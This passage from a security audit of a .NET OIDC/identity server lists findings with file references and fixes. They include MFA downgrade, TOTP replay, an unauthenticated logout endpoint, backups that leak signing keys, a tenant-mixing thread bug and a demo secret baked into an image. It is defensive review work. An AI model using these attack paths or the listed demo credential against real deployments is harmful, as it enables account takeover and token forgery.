`TccProvisioningOrchestrator.cs:40,43,47,55,66,276,280` *(now directly verified)*. `_resolvedApps` is set on the calling thread (line 40) immediately before `await ProvisionAsync(user, appIds, ct)`, whose first `await` (line 55) can resume `GetAppConfig` (line 276) on a **different** pooled thread where `_resolvedApps` is null/stale → the cache miss falls through to `appProvider.GetAppsAsync().GetAwaiter().GetResult()` (line 280, **sync-over-async** → thread-pool starvation under load), and `_resolvedApps = null` (line 43) runs on yet another thread so the setter thread is never cleared. Single-tenant impact is the blocking fallback; in the Cloud host where apps are per-tenant, a stale `_resolvedApps` from a prior request on the reused thread can resolve the **wrong tenant's `CallbackUrl`/`ApiKey`** for this user — cross-tenant misdirection / API-key leak. **Fix:** thread the resolved dictionary through the call chain as a parameter (or `AsyncLocal`), never `[ThreadStatic]` mutated around awaits.

### 13.4 — Device approval relies on SameSite for CSRF; no poll interval — **LOW**
`/api/auth/device/approve` is `DisableAntiforgery()` and depends on the cookie's `SameSite=Lax` to block cross-site approval-CSRF (adequate today, but a dedicated confirm step / antiforgery token is stronger for a tokens-granting action). The device token-poll path returns `authorization_pending` with no `interval`/`slow_down` enforcement (RFC 8628 §3.5) — low.

## 14. Startup / deployment hardening

**Positives:** `ExceptionHandlingMiddleware` leaks no stack/exception detail — it returns a fixed `server_error` + localized message + correlation id in all environments (no `IsDevelopment()` verbose branch), logging the exception server-side only. No real infrastructure secrets are committed (only the well-known Azurite dev key). No Swagger/dev-exception-page/dev endpoints reachable in prod. Absolute URLs are built from the configured `Issuer`, and `UseForwardedHeaders` deliberately does **not** trust `X-Forwarded-Host` — so no host-header injection into issuer/reset links.

### 14.1 — `load-test` client with a plaintext secret + `client_credentials` baked into the published demo image — **MEDIUM (demo)**
`demos/custom-server/appsettings.json:7-15` seeds `client_id=load-test` / `client_secret=load-test-secret` (`client_credentials`), and `demos/custom-server/Dockerfile:20` COPYs that file into the publicly-pushed demo image deployed at the live demo. Known credential that can mint tokens against the demo issuer. Scopes limited to `openid profile email` (not admin), so blast radius is bounded. **Fix:** don't bake a known-secret seed client into a published image; inject via env at deploy time. Seeding is also never environment-gated (`ClientSeedService`/`ProviderSeedService` run whenever a `Clients` section exists) — a stray section in prod config silently creates live clients.

### 14.2 — Containers run as root — **LOW/MEDIUM**
None of `Dockerfile`, `Dockerfile.migration`, `demos/custom-server/Dockerfile` set a `USER`; the .NET base images default to root though the app listens on 8080. Add a non-root `USER` (or use the chiseled/`$APP_UID` images). (Also: no `UseHttpsRedirection`; `AllowedHosts:"*"` — acceptable behind a TLS-terminating ingress, related to §4.3.)

## 15. MFA crypto/enrollment, consent, keys/email, backup/restore (final round)

### 15.1 — TOTP code replay within the validity window — **MEDIUM**
`TotpService.cs:34` (±1 step, ~90s window) + `MfaEndpoints.cs:53-73`. There's no per-code / last-accepted-step consumption — only `LastUsedAt` is stamped, and `VerifyCode` never records or checks the matched time-step. The MfaChallenge is single-use, but a captured 6-digit code can be replayed against a *fresh* challenge for up to ~90s (an attacker who has the password and shoulder-surfs/intercepts one code). **Fix:** persist the last-accepted step per TOTP credential and reject `step <= last`. (TOTP secret entropy 160-bit, HMAC-SHA1/6/30 consistent with the otpauth URI, constant-time compare — all clean. Recovery codes: 40-bit, SHA-256-hashed, single-use, constant-time — clean; non-atomic consume is LOW.)

### 15.2 — MFA downgrade: `DELETE /credentials/{id}` disables MFA with no step-up — **MEDIUM**
`MfaSetupEndpoints.cs:358-388` *(verified)*. The handler resolves the user from a cookie **or** the (reusable, TTL-bound) setup token, deletes the credential, and if no TOTP/WebAuthn remain sets `user.MfaEnabled = false` — with no re-authentication or existing-factor verification. A live session (incl. one obtained MFA-free via §9.1, or post-XSS) or a leaked setup token can strip all factors and turn MFA off. **Fix:** require step-up (recent password / existing factor) before removing the last strong factor; disallow the setup-token auth mode on `DELETE`. (Enrollment authz is otherwise sound — no `userId`-in-body IDOR; the setup token is 256-bit, password-gated, user-bound. Setup token isn't consumed on read, so it's a reusable bearer for its 15-min TTL — LOW/MEDIUM.)

### 15.3 — WebAuthn assertion: clone/sign-count regression surfaces as 500, dead success branch; registration uniqueness callback is a no-op — **MEDIUM / LOW**
`WebAuthnService.cs:58,114,117,153` + `MfaEndpoints.cs:147-155`. Fido2NetLib rejects sign-count regression by *throwing*, but `CompleteAssertionAsync` hard-returns `true` (the `if (!success)` branch is dead) and the throw isn't caught → a cloned authenticator yields a 500 instead of a clean 401 (functionally rejected, wrong failure mode). `IsCredentialIdUniqueToUserCallback` is hard-coded `true`, so a colliding credential ID could overwrite another user's `credId→userId` index (`Upsert/Replace`). RP ID/origin and challenge single-use are correctly enforced. **Fix:** catch `Fido2VerificationException` → 401; implement the uniqueness callback.

### 15.4 — Unauthenticated `/_internal/backchannel-logout` revokes any subject's sessions — **HIGH** — ✅ FIXED (`security-fixes-top8`)
`BackChannelLogoutEndpoint.cs:21-24,39-101` *(verified)*. Mapped `.AllowAnonymous().DisableAntiforgery()` on the public listener; takes a bare `{ "SubjectId": "…" }` and calls `grantStore.RemoveAllBySubjectAsync(SubjectId)` — revoking all refresh tokens/consents for any subject, with no auth and no `logout_token` validation. Anyone who can reach it (ingress misconfig, SSRF to localhost, co-located pod) can force-logout/grant-revoke any user repeatedly (targeted DoS) and enumerate which clients a subject has sessions with (response counts). There is **no in-app `/_internal/*` guard**, and `UseForwardedHeaders` trusting all proxies (§4.1) means any IP-based defense would be spoofable. The endpoint also appears **dead/redundant** — the real back-channel logout runs in-process inside `EndSessionEndpoint`. Same exposure class as `/_internal/cluster/gossip` (§8). **Fix:** remove it, or require authenticated/mTLS/cluster-secret access enforced in code + an in-app deny for externally-forwarded `/_internal/*`.

### 15.5 — Backups expose signing-key private material; restore verifies no integrity — **HIGH (offline tooling)** — ✅ FIXED (`security-fixes-top8`)
`BackupService.cs:88,200-217`, `SigningKeyEntity.cs:17`, `ProtocolSigningKeyOps.cs:170-177` *(D-export verified earlier)*. Backup serializes every entity property verbatim to plaintext gzip-JSONL with no field allow-list/redaction; for **local-key-source** tenants this includes `SigningKeys.KeyMaterialJson` containing the EC **private** scalar `D` → anyone who reads a backup file can forge tokens. Under the default `PlaintextSecretProvider`, TOTP seeds (`MfaCredentials.SecretProtected`) and upstream `OidcProviders.ClientSecret` are also plaintext in the backup (Key Vault stores only references → safe). `FileSystemBackupTarget` writes plain files (no encryption/ACL). **Restore** (`RestoreService.cs:35-71`) blindly upserts entities and **never verifies integrity** — `BackupManifest.FileHashes` is documented as "verified during restore" but is never populated or checked — so a tampered backup is a production-write primitive (inject an admin client, reset a password hash, or inject an attacker-controlled signing key → token forgery). Vault key source mitigates the private-key exposure; Migration tool is SQL-injection-clean (parameterized). **Fix:** exclude `SigningKeys` (or envelope-encrypt backups), require Key Vault in any backed-up environment, and populate+verify `FileHashes` (ideally a signed manifest) before the first restore write. Also: `MergeService`/`RollupService` build file paths from untrusted manifest table-name keys via `Path.Combine` with no `..`/separator sanitization → arbitrary file write when merging an untrusted backup (MEDIUM).

### 15.6 — Discovery advertises `RS256` but the server signs `ES256` — **LOW (interop)**
`DiscoveryEndpoint.cs:47` sets `id_token_signing_alg_values_supported = ["RS256"]` while tokens are ES256 and JWKS publishes only EC keys → strict RPs that pre-select RS256 fail validation. Set `["ES256"]`. (PKCE `S256` and `response_types=["code"]` are advertised correctly; JWKS is public-only.)

### 15.7 — Consent POST relies on SameSite (no antiforgery), and other low items — **LOW**
`ConsentEndpoint.cs:36` — `POST /consent` has no `.RequireAuthorization()` and no antiforgery; it does reject anonymous callers (manual `httpContext.User` check) so CSRF rests entirely on `SameSite=Lax`. Consent is correctly bound to `(subject, client)`; stored scopes aren't validated against `AllowedScopes` at consent time but the authorize endpoint caps issuance to `AllowedScopes` so it's not exploitable. Other clean-but-noted: auth code is stored as the raw grant key rather than `SHA256(code)` (hardening); `PlaintextSecretProvider` is plaintext at rest (prod must set `SecretProvider:VaultUri`, see §11.C). **Positives:** EmailService builds links from the configured Issuer with no header/content injection and logs no tokens; `CookieSignInHelper` mints a fresh `sid` per sign-in (no fixation) and stores no secrets; key manager returns only ES256 public keys; Vault Transit ES256 encoding is correct P1363.

## 16. Coverage — complete
The full attacker-facing surface and supporting services have now been reviewed: SAML, OIDC core (authorize/token/PKCE/PAR/device/DCR/discovery/JWKS/userinfo/introspection/revocation/end-session/back-channel-logout), federation, SCIM, admin APIs, interactive auth + MFA (crypto + enrollment), consent, multi-tenancy/storage partitioning, crypto/key management + Vault/Key Vault/plaintext providers, email, cookie sign-in, cluster gossip, startup/wiring/Docker/secrets, the frontend, the backup/restore/migration tooling, and the documentation set. The only items intentionally left at a glance (low attacker relevance): `RollupService` internals, `GrantReconciliationService`/`TokenCleanupService`/`SigningKeyRotationService` background jobs, and individual `Table*Store` CRUD beyond the user/grant/scim/group/signing-key stores already covered.
